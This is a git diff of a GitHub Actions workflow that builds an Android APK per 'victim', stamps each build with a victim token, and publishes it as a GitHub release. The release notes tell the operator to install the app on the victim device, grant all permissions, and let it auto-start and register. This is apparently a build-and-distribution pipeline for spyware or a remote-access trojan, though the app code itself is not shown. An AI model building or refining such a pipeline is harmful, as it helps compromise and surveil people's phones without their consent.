@@ -22,17 +22,30 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      # ============================================
+      # 1. Checkout
+      # ============================================
       - name: Checkout
         uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          token: ${{ secrets.GITHUB_TOKEN }}
 
+      # ============================================
+      # 2. Bump Version
+      # ============================================
       - name: Bump Version
         id: version
         run: |
-          # اقرأ الـ version الحالي
-          CURRENT=$(grep VERSION_CODE version.properties | cut -d= -f2)
-          NEW=$((CURRENT + 1))
+          if [ ! -f version.properties ]; then
+            echo "VERSION_CODE=1" > version.properties
+            echo "VERSION_NAME=1.0.1" >> version.properties
+            CURRENT=0
+          else
+            CURRENT=$(grep VERSION_CODE version.properties | cut -d= -f2 | tr -d ' ')
+          fi
           
-          # حدّث الملف
+          NEW=$((CURRENT + 1))
           echo "VERSION_CODE=$NEW" > version.properties
           echo "VERSION_NAME=1.0.$NEW" >> version.properties
           
@@ -40,25 +53,60 @@ jobs:
           echo "new_name=1.0.$NEW" >> $GITHUB_OUTPUT
           echo "== Bumped: $CURRENT → $NEW =="
 
+      # ============================================
+      # 3. Commit Version Bump
+      # ============================================
       - name: Commit Version Bump
         run: |
-          git config user.name "github-actions"
-          git config user.email "actions@github.com"
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
           git add version.properties
-          git commit -m "chore: bump version to ${{ steps.version.outputs.new_name }}" || true
-          git push || true
+          git commit -m "chore: bump version to ${{ steps.version.outputs.new_name }} [skip ci]" || echo "No changes to commit"
+          git push || echo "Push skipped"
 
+      # ============================================
+      # 4. Set up JDK 17
+      # ============================================
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
 
+      # ============================================
+      # 5. Set up Gradle (★ الأهم ★)
+      # ============================================
+      - name: Setup Gradle
+        uses: gradle/gradle-build-action@v3
+        with:
+          gradle-version: 8.2
+
+      # ============================================
+      # 6. ★★★ Generate Gradle Wrapper ★★★
+      # ============================================
+      - name: Generate Gradle Wrapper
+        run: |
+          echo "== Generating Gradle Wrapper =="
+          gradle wrapper --gradle-version 8.2 --distribution-type bin
+          chmod +x gradlew
+          ls -la gradlew gradle/wrapper/ || true
+          echo "== Wrapper generated =="
+
+      # ============================================
+      # 7. Setup Android SDK
+      # ============================================
       - name: Setup Android SDK
         run: |
           echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
-          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
+          echo "ANDROID_SDK_ROOT=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
+          
+          if [ -f "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" ]; then
+            yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
+          fi
 
+      # ============================================
+      # 8. Cache Gradle
+      # ============================================
       - name: Cache Gradle
         uses: actions/cache@v3
         with:
@@ -66,7 +114,12 @@ jobs:
             ~/.gradle/caches
             ~/.gradle/wrapper
           key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          restore-keys: |
+            ${{ runner.os }}-gradle-
 
+      # ============================================
+      # 9. Set Victim Token
+      # ============================================
       - name: Set Victim Token
         id: preoutputs
         run: |
@@ -77,19 +130,38 @@ jobs:
           echo "name=$NAME" >> $GITHUB_OUTPUT
           echo "short=$SHORT" >> $GITHUB_OUTPUT
           echo "== Token: $TOKEN =="
+          echo "== Name: $NAME =="
 
+      # ============================================
+      # 10. Grant Execute Permission
+      # ============================================
       - name: Grant Execute Permission
-        run: chmod +x gradlew || true
+        run: chmod +x gradlew
 
+      # ============================================
+      # 11. Build APK ★
+      # ============================================
       - name: Build APK
         env:
           VICTIM_TOKEN: ${{ steps.preoutputs.outputs.token }}
         run: |
-          ./gradlew assembleDebug --no-daemon --stacktrace
+          echo "== Starting Build =="
+          echo "VICTIM_TOKEN=${VICTIM_TOKEN:0:12}..."
+          ./gradlew assembleDebug --no-daemon --stacktrace --info
+          echo "== Build Complete =="
 
+      # ============================================
+      # 12. List APK
+      # ============================================
       - name: List APK
-        run: ls -la app/build/outputs/apk/debug/ || echo "No APK dir"
+        run: |
+          echo "== Listing APK output =="
+          ls -la app/build/outputs/apk/debug/ || echo "No APK dir"
+          find . -name "*.apk" -type f || echo "No APKs found"
 
+      # ============================================
+      # 13. Rename APK
+      # ============================================
       - name: Rename APK
         run: |
           mkdir -p output
@@ -102,6 +174,9 @@ jobs:
           echo "== APK renamed to: $APK_NAME =="
           ls -la output/
 
+      # ============================================
+      # 14. Upload Artifact
+      # ============================================
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
@@ -109,6 +184,9 @@ jobs:
           path: output/*.apk
           retention-days: 30
 
+      # ============================================
+      # 15. Create Release
+      # ============================================
       - name: Create Release
         uses: softprops/action-gh-release@v1
         with:
@@ -116,12 +194,22 @@ jobs:
           name: Victim-${{ steps.preoutputs.outputs.name }}-${{ steps.preoutputs.outputs.short }}
           body: |
             ## Victim APK
-            - Victim: ${{ steps.preoutputs.outputs.name }} - ${{ steps.preoutputs.outputs.short }}...
-            - Version: ${{ steps.version.outputs.new_name }}
-            - Token: ${{ steps.preoutputs.outputs.short }}...
-            - Build: ${{ github.run_number }}
+            
+            - **Victim:** ${{ steps.preoutputs.outputs.name }} - ${{ steps.preoutputs.outputs.short }}...
+            - **Version:** ${{ steps.version.outputs.new_name }}
+            - **Version Code:** ${{ steps.version.outputs.new_code }}
+            - **Token:** `${{ steps.preoutputs.outputs.short }}...`
+            - **Build:** #${{ github.run_number }}
+            - **Date:** ${{ github.event.head_commit.timestamp }}
+            
+            ### Installation
+            1. Download the APK below
+            2. Install on victim device
+            3. Grant all permissions
+            4. App auto-starts and registers
           files: output/*.apk
           draft: false
           prerelease: false
+          generate_release_notes: false
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
